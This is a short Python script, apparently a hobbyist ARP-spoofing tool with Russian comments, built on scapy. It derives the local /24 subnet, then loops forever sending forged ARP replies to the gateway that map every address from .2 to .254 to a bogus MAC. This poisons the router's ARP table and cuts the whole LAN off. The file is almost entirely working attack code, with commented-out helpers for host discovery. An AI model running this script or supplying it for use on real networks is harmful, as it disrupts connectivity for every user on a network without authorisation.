# -*- coding: utf-8 -*-

import scapy.all as scapy
import argparse
import socket

ip_up_list = []
self_ip_global = '';

def get_self_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    self_ip_global = s.getsockname()[0]
    return s.getsockname()[0]
    s.close()

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    except BaseException:
        print('Smth wrong')

def spoof(target_ip, spoof_ip):
    # target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:aa",
                       psrc=spoof_ip)
    scapy.send(packet, verbose=False)


    #target_ip => my computer
    #spoof_ip => router ip
    #мы отправляем пакет на spoof_ip с парой 'target_ip' : target_mac

def get_masc(): #получение маски
    self_ip = get_self_ip().split('.')
    self_ip = self_ip[0] + '.' + self_ip[1] + '.' + self_ip[2] + '.'

    return self_ip

# def get_list_of_mac_adress():
#     mac_list = []
#     my_ip = get_self_ip()
#
#     if not ip_up_list:
#         get_all_up_ip()
#
#     for ip in ip_up_list:
#         if ip == 'my_ip':
#             continue
#         try:
#             mac_list.append(get_mac(ip))
#         except BaseException:
#             print('Smth wrong')
#             continue
#
#     return mac_list

def get_all_ip_list():
    ip = []
    masc = get_masc()

    for i in range(2,256):
        ip.append(masc + str(i))

    return ip

# def get_all_up_ip(): #получить все ip адреса сети по маске
#     TIMEOUT = 1
#     conf.verb = 0
#     for ip in range(0, 5): #256
#         packet = scapy.IP(dst= get_masc() + str(ip), ttl=20)/scapy.ICMP()
#         reply = scapy.sr1(packet, timeout=TIMEOUT)
#         if not (reply is None):
#               ip_up_list.append(get_masc() + str(ip))
#               print("New up IP " + get_masc() + str(ip) +" Loop count: " + str(ip))
#         else:
#               print("Loop count: " + str(ip))


ip = get_all_ip_list()
gateway = get_masc() + '1'
while 1:
    for k in ip:
        spoof(gateway, k)
        print(k)

#get list of ip adress or take by mask /24 +++
#get mac of all ip adress
#change arp table at router for all ip adress by mac
